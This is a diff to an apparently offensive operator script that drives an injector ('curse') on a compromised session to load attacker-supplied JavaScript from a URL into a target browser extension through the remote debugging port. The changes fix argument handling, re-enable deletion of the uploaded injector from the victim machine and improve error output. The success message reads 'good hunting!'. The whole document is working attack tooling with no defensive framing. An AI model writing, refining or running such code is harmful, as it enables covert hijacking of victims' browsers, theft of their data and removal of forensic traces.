@@ -38,7 +38,7 @@ const parser = new ArgumentParser({
 })
 parser.add_argument('--config', { required: true, help: 'path to operator config' })
 parser.add_argument('--session', { required: true, type: Number, help: 'target session id' })
-parser.add_argument('--js-url', { required: true, type: Number, help: 'payload .js url' })
+parser.add_argument('--js-url', { required: true, help: 'payload .js url' })
 const args = parser.parse_args()
 
 // ----------------------------------------------------------------------
@@ -214,15 +214,15 @@ if (fs.existsSync(args.config)) {
 
     }
  
-    console.log(`[*] Executing payload injector ...`)
-    const injectorArgs = ['curse', '--js-url', args.js_url, '--remote-debugging-port', `${DEBUG_PORT}`]
-    const injection = await interact.execute(upload.getPath(), injectorArgs, true)
+    console.log(`[*] Executing payload injector with payload ${args.js_url} ...`)
+    const injection = await interact.execute(upload.getPath(), ['curse', '-j', args.js_url, '-r', `${DEBUG_PORT}`], true)
 
     console.log('[*] Cleaning up ...')
-    // await interact.rm(upload.getPath())
+    await interact.rm(upload.getPath())
 
     if (injection.getStatus() !== 0) {
-      console.log(`[!] Injector exit status ${injection.getStatus()}`)
+      console.error(`[!] Injector exit status ${injection.getStatus()}:`)
+      console.error(injection.getResult())
     } else {
       console.log('[*] Successfully injected payload into target extension, good hunting!')
     }
